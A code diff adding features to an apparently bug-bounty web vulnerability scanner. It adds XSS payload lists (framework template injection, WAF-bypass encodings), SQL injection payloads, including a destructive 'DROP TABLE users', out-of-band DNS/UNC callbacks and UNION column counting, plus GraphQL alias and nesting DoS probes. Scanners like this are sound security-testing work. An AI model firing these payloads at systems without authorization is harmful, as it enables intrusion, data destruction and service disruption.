@@ -23,6 +23,7 @@ from modules.utils import (
     OOBDetectionFramework, BrowserValidator, VerificationStage,
     EvidenceStrength, ConfidenceLevel, calculate_confidence,
     evidence_strength_from_score, false_positive_risk_from_score,
+    prioritize_findings, compute_priority_score,
     TechnologyFingerprinter,
 )
 
@@ -44,6 +45,65 @@ XSS_PAYLOADS = [
     '<script>alert(1)</script>',
     '"><script>alert(1)</script>',
     "javascript:alert(1)",
+    # mXSS — parser mutation
+    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+    '<select><option><style></style><img src=x onerror=alert(1)></select>',
+]
+
+# Framework-specific XSS payloads for React, Angular, Vue, jQuery
+FRAMEWORK_XSS_PAYLOADS = {
+    "react": [
+        {"payload": '{{__proto__.toString.constructor("alert(1)")()}}', "sink": "dangerouslySetInnerHTML"},
+        {"payload": "<img src=x onerror=alert(1)>", "sink": "dangerouslySetInnerHTML"},
+    ],
+    "angular": [
+        {"payload": "{{constructor.constructor('alert(1)')()}}", "sink": "template"},
+        {"payload": "{$on.constructor('alert(1)')()}", "sink": "template"},
+        {"payload": "{{a='constructor';b='alert(1)';this[a][a](b)()}}", "sink": "template"},
+        {"payload": "[innerHTML]='<img src=x onerror=alert(1)>'", "sink": "property_binding"},
+    ],
+    "vue": [
+        {"payload": "{{constructor.constructor('alert(1)')()}}", "sink": "v-html"},
+        {"payload": "{{{constructor.constructor('alert(1)')()}}}", "sink": "template"},
+        {"payload": '<div v-html="\'<img src=x onerror=alert(1)>\'">', "sink": "v-html"},
+    ],
+    "jquery": [
+        {"payload": '<img src=x onerror=alert(1)>', "sink": "$.html()"},
+        {"payload": "<script>alert(1)</script>", "sink": "$.append()"},
+        {"payload": "<img src=x onerror=alert(1)>", "sink": "$()"},
+    ],
+    "generic": [
+        {"payload": "';-alert(1)-'", "sink": "eval"},
+        {"payload": "\\';alert(1)//", "sink": "js_string"},
+        {"payload": "</script><script>alert(1)</script>", "sink": "script_breakout"},
+    ],
+}
+
+# WAF bypass payloads — encoding variants, case mutations, comment injection
+WAF_BYPASS_XSS = [
+    '<svg/onload=alert&#40;1&#41;>',
+    '<svg/onload=alert(1)>',
+    '%3Csvg/onload=alert(1)%3E',
+    '%253Csvg/onload=alert(1)%253E',
+    '<SvG/OnLoAd=alert(1)>',
+    '<svg/onload=alert(1)<!--',
+    '--><svg/onload=alert(1)>',
+    '"><svg/onload=alert(1)>',
+    '"><svg/onload=alert(1)<!--',
+    "onload=alert(1)//<svg ' \"",
+    'javascript:alert(1)',
+    'java%00script:alert(1)',
+    'java%09script:alert(1)',
+    'JaVaScRiPt:alert(1)',
+    '&#106;avascript:alert(1)',
+    '&#x6A;avascript:alert(1)',
+]
+
+# Probe payloads for DOM sink detection
+DOM_XSS_PROBES = [
+    "bbh_dom_probe",
+    "<img src=x onerror=alert(1)>",
+    "';alert(1)//",
 ]
 
 DEFAULT_XSS_PAYLOADS: dict = {
@@ -60,6 +120,9 @@ DEFAULT_XSS_PAYLOADS: dict = {
         '"><img src=x onerror=window.__bbh_xss=1>',
         "javascript:window.__bbh_xss=1",
     ],
+    "framework": FRAMEWORK_XSS_PAYLOADS,
+    "waf_bypass": WAF_BYPASS_XSS,
+    "dom_probes": DOM_XSS_PROBES,
 }
 
 CONTEXT_XSS_PAYLOADS = {
@@ -94,26 +157,77 @@ SQLI_ERRORS = [
     "quoted string not properly terminated", "syntax error",
     "pg_query", "sqlite3", "microsoft sql server", "jdbc",
     "sqlstate", "sql server", "pdo", "you have an error in your sql",
+    "unexpected end of SQL command", "division by zero",
+    "column count doesn't match", "unknown column",
 ]
 
 DEFAULT_SQLI_PAYLOADS = {
     "error_based": [
         "'", '"', "' OR '1'='1", "' OR 1=1--", '" OR 1=1--',
         "1; DROP TABLE users--", "' UNION SELECT NULL--",
+        # WAF bypass variants
+        "' OR 1=1-- -", "' OR 1=1#", "' OR '1'='1' --",
+        "'/**/OR/**/1=1--", "'/*!00000OR*/1=1--",
     ],
     "time_based": [
         "' AND SLEEP(5)-- -", '" AND SLEEP(5)-- -',
         "'; WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--",
+        # PostgreSQL, Oracle
+        "' AND (SELECT pg_sleep(5))--", "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
     ],
     "boolean_based": [
         [" AND 1=1-- -", " AND 1=2-- -"],
         ["' AND '1'='1", "' AND '1'='2"],
         ["' AND 1=1--", "' AND 1=2--"],
     ],
+    "union": [
+        "' UNION SELECT NULL--",
+        "' UNION SELECT NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        # ORDER BY column counting
+        "' ORDER BY 1--",
+        "' ORDER BY 2--",
+        "' ORDER BY 3--",
+        "' ORDER BY 4--",
+        "' ORDER BY 5--",
+        "' ORDER BY 6--",
+        "' ORDER BY 7--",
+        "' ORDER BY 8--",
+        "' ORDER BY 9--",
+        "' ORDER BY 10--",
+    ],
     "oob": [
         "'; exec xp_dirtree '//{oob}/test'--",
         "' UNION SELECT LOAD_FILE(CONCAT('\\\\', '{oob}', '\\\\test'))",
         "' OR 1=1 INTO OUTFILE '\\\\{oob}\\test'--",
+        # DNS-based OOB
+        "' AND (SELECT utl_inaddr.get_host_address('{oob}') FROM dual)--",
+        "' AND (SELECT pg_read_file('\\\\{oob}\\test'))--",
+    ],
+}
+
+# POST body SQLi payloads — JSON, XML, form-encoded
+POST_SQLI_PAYLOADS = {
+    "json": [
+        '{"id": "1\' OR 1=1--"}',
+        '{"id": "1\' AND SLEEP(5)--"}',
+        '{"query": "1\' UNION SELECT NULL--"}',
+    ],
+    "xml": [
+        '<?xml version="1.0"?><id>1\' OR 1=1--</id>',
+        '<?xml version="1.0"?><query>1\' UNION SELECT NULL--</query>',
+    ],
+    "form": [
+        "id=1' OR 1=1--",
+        "id=1' AND SLEEP(5)--",
+        "query=1' UNION SELECT NULL--",
     ],
 }
 
@@ -355,6 +469,7 @@ class VulnScanner:
         self.baselines    = BaselineFingerprinter(self.session, self.timeout)
         self.tech_fingerprinter = TechnologyFingerprinter(self.session, self.timeout)
         self._prepared    = False
+        self._second_order_store: dict[str, list[dict]] = {}
 
     # ── Dedup Wrapper ────────────────────────────────────────────────────
 
@@ -368,7 +483,8 @@ class VulnScanner:
             return True
 
     def _get_findings(self) -> list[dict]:
-        return self.dedup.get_findings()
+        raw = self.dedup.get_findings()
+        return prioritize_findings(raw)
 
     # ── Legacy Backward-Compat Helpers (used by ApiScanner, IdorScanner) ──
 
@@ -743,11 +859,20 @@ class VulnScanner:
             except Exception as e:
                 log(f"  [SQLi] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
 
+        # ── POST body SQLi (JSON, XML, form-encoded) ─────────────────
+        for url in self.recon.get("urls", []):
+            if not self._in_scope(url):
+                continue
+            try:
+                self._sqli_test_post_body(url, payloads, oob_host)
+            except Exception as e:
+                log(f"  [SQLi POST] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
+
         return self._get_findings()
 
     def _sqli_test_parameter(self, url: str, param: str, original_value: str,
                               payloads: dict, oob_host: Optional[str]) -> dict:
-        signals = {"error": False, "boolean": False, "time": False, "oob": False}
+        signals = {"error": False, "boolean": False, "time": False, "union": False, "oob": False}
         evidence_parts = []
 
         # ── Error-based ───────────────────────────────────────────────
@@ -805,6 +930,30 @@ class VulnScanner:
                 evidence_parts.append(f"time:delays={delays}, baseline={baseline_delay:.2f}s")
                 break
 
+        # ── UNION-based (column counting via ORDER BY + UNION SELECT NULL) ──
+        for payload in payloads.get("union", []):
+            test_url = self._inject_param(url, param, payload)
+            resp = safe_get(self.session, test_url, self.timeout)
+            if not resp:
+                continue
+            if "union" in evidence_parts:
+                continue
+            lower = resp.text.lower()
+            # ORDER BY N success = no error. ORDER BY N failure = error.
+            if "order by" in payload.lower():
+                if not any(err in lower for err in SQLI_ERRORS):
+                    # ORDER BY succeeded at this column count — good sign
+                    evidence_parts.append(f"union:order_by_ok:{payload}")
+                    signals["union"] = True
+                    continue
+            # UNION SELECT NULL... success = different content than normal
+            if "union select" in payload.lower() and "null" in payload.lower():
+                if not any(err in lower for err in SQLI_ERRORS):
+                    # UNION succeeded — column count matches
+                    evidence_parts.append(f"union:matching_columns:{payload}")
+                    signals["union"] = True
+                    break
+
         # ── OOB ──────────────────────────────────────────────────────
         if oob_host:
             for payload in payloads.get("oob", []):
@@ -860,6 +1009,94 @@ class VulnScanner:
             verification_stage=stage,
             validation_steps=[f"Signal: {s}" for s in evidence_parts],
         )
+
+    def _sqli_test_post_body(self, url: str, payloads: dict, oob_host: Optional[str]) -> None:
+        """Test POST endpoints with SQLi payloads in JSON, XML, and form bodies."""
+        post_payloads = POST_SQLI_PAYLOADS
+        headers = {"Content-Type": "application/json"}
+        for payload in post_payloads["json"]:
+            resp = safe_post(self.session, url, data=payload, headers=headers, timeout=self.timeout)
+            if resp and any(err in resp.text.lower() for err in SQLI_ERRORS):
+                signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
+                f = self._sqli_build_finding(url, "POST JSON body", signals)
+                if f:
+                    self._add(f)
+                break
+
+        headers = {"Content-Type": "application/xml"}
+        for payload in post_payloads["xml"]:
+            resp = safe_post(self.session, url, data=payload, headers=headers, timeout=self.timeout)
+            if resp and any(err in resp.text.lower() for err in SQLI_ERRORS):
+                signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
+                f = self._sqli_build_finding(url, "POST XML body", signals)
+                if f:
+                    self._add(f)
+                break
+
+        headers = {"Content-Type": "application/x-www-form-urlencoded"}
+        for payload in post_payloads["form"]:
+            resp = safe_post(self.session, url, data=payload, headers=headers, timeout=self.timeout)
+            if resp and any(err in resp.text.lower() for err in SQLI_ERRORS):
+                signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
+                f = self._sqli_build_finding(url, "POST form body", signals)
+                if f:
+                    self._add(f)
+                break
+
+        # OOB variants for POST bodies
+        if oob_host:
+            oob_payloads = payloads.get("oob", [])
+            for oob_p in oob_payloads:
+                formatted = oob_p.replace("{oob}", f"{self.oob.callback_token}.{oob_host}")
+                resp = safe_post(self.session, url, data=json.dumps({"id": formatted}),
+                                 headers={"Content-Type": "application/json"}, timeout=self.timeout)
+                if resp:
+                    time.sleep(1)
+                    if self.oob.poll():
+                        signals = {"error": False, "boolean": False, "time": False, "union": False, "oob": True}
+                        f = self._sqli_build_finding(url, "POST JSON body (OOB)", signals)
+                        if f:
+                            self._add(f)
+                        break
+
+    # ═════════════════════════════════════════════════════════════════════
+    # Second-Order Injection Tracking
+    # ═════════════════════════════════════════════════════════════════════
+
+    def _record_second_order(self, url: str, param: str, payload: str) -> None:
+        """Record a submitted payload that may be stored (second-order)."""
+        key = url.split("?")[0]
+        self._second_order_store.setdefault(key, []).append({
+            "param": param,
+            "payload": payload,
+            "submitted_at": time.time(),
+        })
+
+    def _check_second_order(self) -> None:
+        """Re-request pages to find delayed reflections of stored payloads."""
+        delay = 3  # seconds to wait before checking
+        time.sleep(delay + 1)
+        for base_url, entries in list(self._second_order_store.items()):
+            if not self._in_scope(base_url):
+                continue
+            resp = safe_get(self.session, base_url, self.timeout)
+            if not resp:
+                continue
+            for entry in entries:
+                payload = entry["payload"]
+                if payload in resp.text and payload not in self.recon.get("body", ""):
+                    f = finding(
+                        vuln_type="Second-Order Injection",
+                        url=base_url,
+                        severity="high",
+                        details=f"Stored payload reflected in {base_url}",
+                        evidence=f"Payload: {payload} | Submitted via param: {entry['param']}",
+                        verification_stage=VerificationStage.VALIDATED.value,
+                        validation_steps=[f"Payload '{payload}' submitted via {entry['param']} then reflected on {base_url}"],
+                    )
+                    if f:
+                        self._add(f)
+                    break
 
     # ═════════════════════════════════════════════════════════════════════
     # SSRF — OOB-Only Confirmation
@@ -1253,6 +1490,35 @@ class VulnScanner:
             except Exception as e:
                 log(f"  [XSS Form] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
 
+        # ── DOM XSS scanning via Playwright sink injection ──────────
+        dom_probes = payloads.get("dom_probes", DOM_XSS_PROBES)
+        for url in self.recon.get("urls", []):
+            if not self._in_scope(url):
+                continue
+            try:
+                dom_findings = self.browser.scan_dom_xss(url, dom_probes)
+                for df in dom_findings:
+                    f = finding(
+                        vuln_type=f"DOM-based XSS ({df['sink']})",
+                        url=df["url"],
+                        severity="high",
+                        details=f"DOM sink '{df['sink']}' triggered by probe in {url}",
+                        evidence=f"Probe: {df['probe']} | Sink: {df['sink']}",
+                        verification_stage=VerificationStage.EXPLOITABLE.value,
+                        validation_steps=[f"DOM sink '{df['sink']}' executed probe via Playwright"],
+                    )
+                    if f:
+                        self._add(f)
+                    log(f"  [DOM XSS] {df['sink']} at {url}", Colors.RED, verbose_only=True, verbose=self.verbose)
+            except Exception as e:
+                log(f"  [DOM XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
+
+        # ── Second-order injection check ────────────────────────────
+        try:
+            self._check_second_order()
+        except Exception as e:
+            log(f"  [Second-Order] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
+
         return self._get_findings()
 
     def _detect_xss_context(self, body: str, payload: str) -> Optional[str]:
@@ -1282,6 +1548,7 @@ class VulnScanner:
 
         for payload in all_payloads:
             test_url = self._inject_param(url, param, payload)
+            self._record_second_order(url, param, payload)
             resp = safe_get(self.session, test_url, self.timeout)
             if not resp:
                 continue
@@ -1345,6 +1612,7 @@ class VulnScanner:
         for payload in all_payloads:
             data = {f["name"]: f.get("value", "test") for f in form.get("fields", []) if f.get("name")}
             data[field_name] = payload
+            self._record_second_order(action or "", field_name, payload)
 
             if method == "POST":
                 resp = safe_post(self.session, action, data, self.timeout)
@@ -2174,18 +2442,87 @@ class VulnScanner:
         return self._get_findings()
 
     # ═════════════════════════════════════════════════════════════════════
+    # OpenAPI / Swagger — Endpoint Discovery
+    # ═════════════════════════════════════════════════════════════════════
+
+    def scan_openapi(self) -> list[dict]:
+        """
+        Probe common Swagger/OpenAPI specification paths, parse discovered
+        specs, and inject all extracted endpoints back into the URL pool for
+        downstream scanners.
+        """
+        spec_paths = [
+            "/swagger.json", "/api/swagger.json",
+            "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
+            "/openapi.json", "/api/openapi.json",
+            "/api-docs", "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
+            "/swagger-ui.html", "/swagger-resources",
+            "/api/swagger-ui.html", "/api/swagger-resources",
+            "/doc", "/api/doc", "/docs", "/api/docs",
+            "/spec", "/api/spec",
+            "/swagger.yaml", "/api/swagger.yaml",
+            "/openapi.yaml", "/api/openapi.yaml",
+        ]
+        discovered_endpoints: set[str] = set()
+
+        for sp in spec_paths:
+            url = self.base_url + sp
+            try:
+                resp = safe_get(self.session, url, self.timeout)
+                if not resp:
+                    continue
+                # Swagger JSON / OpenAPI JSON
+                if sp.endswith(".json") or sp.endswith("/api-docs") or "swagger-resources" in sp:
+                    try:
+                        spec = resp.json()
+                        paths = spec.get("paths", {}) or spec.get("apis", {}) or {}
+                        if isinstance(paths, dict):
+                            for path in paths:
+                                full = self.base_url.rstrip("/") + "/" + path.lstrip("/")
+                                discovered_endpoints.add(full)
+                    except (json.JSONDecodeError, AttributeError):
+                        pass
+                # Swagger YAML
+                elif sp.endswith(".yaml") or sp.endswith(".yml"):
+                    try:
+                        spec = yaml.safe_load(resp.text)
+                        if isinstance(spec, dict):
+                            paths = spec.get("paths", {})
+                            for path in paths:
+                                full = self.base_url.rstrip("/") + "/" + path.lstrip("/")
+                                discovered_endpoints.add(full)
+                    except yaml.YAMLError:
+                        pass
+                # HTML pages — look for known paths in page text
+                else:
+                    found_paths = re.findall(r'"(/?(?:api|v[0-9]+)/[^"]+)"', resp.text)
+                    discovered_endpoints.update(
+                        self.base_url.rstrip("/") + p if p.startswith("/") else self.base_url.rstrip("/") + "/" + p
+                        for p in found_paths
+                    )
+            except Exception:
+                continue
+
+        if discovered_endpoints:
+            self.recon.setdefault("urls", []).extend(discovered_endpoints)
+            log(f"  [OpenAPI] {len(discovered_endpoints)} endpoints discovered from spec files", Colors.GREEN)
+
+        return self._get_findings()
+
+    # ═════════════════════════════════════════════════════════════════════
     # GraphQL
     # ═════════════════════════════════════════════════════════════════════
 
     def scan_graphql(self) -> list[dict]:
-        findings: list[dict] = []
         endpoints = ["/graphql", "/api/graphql", "/nerdgraph/graphql", "/v1/graphql", "/query"]
-        introspection_query = {"query": "{ __schema { types { name } } }"}
+        introspection_query = {"query": r"{ __schema { types { name } } }"}
         batch_payload = [{"query": "{ __typename }"}] * 50
         headers = {"Content-Type": "application/json"}
 
         for ep in endpoints:
             url = self.base_url + ep
+
+            # ── 1. Introspection ──────────────────────────────────────
             try:
                 r = self.session.post(url, json=introspection_query, headers=headers, timeout=self.timeout)
                 if r.status_code == 200 and "__schema" in r.text:
@@ -2201,8 +2538,9 @@ class VulnScanner:
                     if f:
                         self._add(f)
             except Exception:
-                continue
+                pass
 
+            # ── 2. Query batching ─────────────────────────────────────
             try:
                 r = self.session.post(url, json=batch_payload, headers=headers, timeout=self.timeout)
                 if r.status_code == 200 and isinstance(r.json(), list) and len(r.json()) > 1:
@@ -2210,9 +2548,69 @@ class VulnScanner:
                         vuln_type="GraphQL Query Batching Unrestricted",
                         url=url,
                         severity="medium",
-                        details="Server accepts batched GraphQL arrays with no apparent limit.",
+                        details="Server accepts batched GraphQL arrays with no apparent limit. (50 queries in one request)",
                         evidence="__typename",
+                        verification_stage=VerificationStage.VALIDATED.value,
+                        validation_steps=["Batch of 50 queries returned 50 responses"],
+                    )
+                    if f:
+                        self._add(f)
+            except Exception:
+                pass
+
+            # ── 3. Field suggestion leakage ──────────────────────────
+            try:
+                r = self.session.post(url, json={"query": "{ "},
+                                      headers=headers, timeout=self.timeout)
+                if r.status_code == 400 and '"suggestions"' in r.text:
+                    f = finding(
+                        vuln_type="GraphQL Field Suggestion Leak",
+                        url=url,
+                        severity="low",
+                        details="Error messages contain suggested field names, aiding attacker recon.",
+                        evidence="suggestions",
+                        verification_stage=VerificationStage.VALIDATED.value,
+                        validation_steps=["Malformed query returned field suggestions"],
+                    )
+                    if f:
+                        self._add(f)
+            except Exception:
+                pass
+
+            # ── 4. Alias-based resource exhaustion ───────────────────
+            try:
+                alias_qs = " ".join(f"a{i}: __typename" for i in range(200))
+                r = self.session.post(url, json={"query": "{" + alias_qs + "}"},
+                                      headers=headers, timeout=self.timeout)
+                if r.status_code == 200:
+                    f = finding(
+                        vuln_type="GraphQL Alias-Based Query DoS",
+                        url=url,
+                        severity="low",
+                        details="Server accepts 200+ aliases in a single query, allowing resource exhaustion.",
+                        evidence="200 aliases accepted",
                         verification_stage=VerificationStage.DETECTED.value,
+                        validation_steps=["200 aliased __typename queries returned 200 results"],
+                    )
+                    if f:
+                        self._add(f)
+            except Exception:
+                pass
+
+            # ── 5. Depth limit testing ───────────────────────────────
+            try:
+                deep_q = "{user{posts{comments{author{posts{comments{author{name}}}}}}}}"
+                r = self.session.post(url, json={"query": deep_q},
+                                      headers=headers, timeout=self.timeout)
+                if r.status_code == 200 and "errors" not in r.text:
+                    f = finding(
+                        vuln_type="GraphQL Deeply Nested Query Allowed",
+                        url=url,
+                        severity="low",
+                        details="Server allows 7+ levels of nested queries, enabling recursive DoS.",
+                        evidence="7+ levels accepted without error",
+                        verification_stage=VerificationStage.DETECTED.value,
+                        validation_steps=["Deeply nested query returned 200 without errors"],
                     )
                     if f:
                         self._add(f)
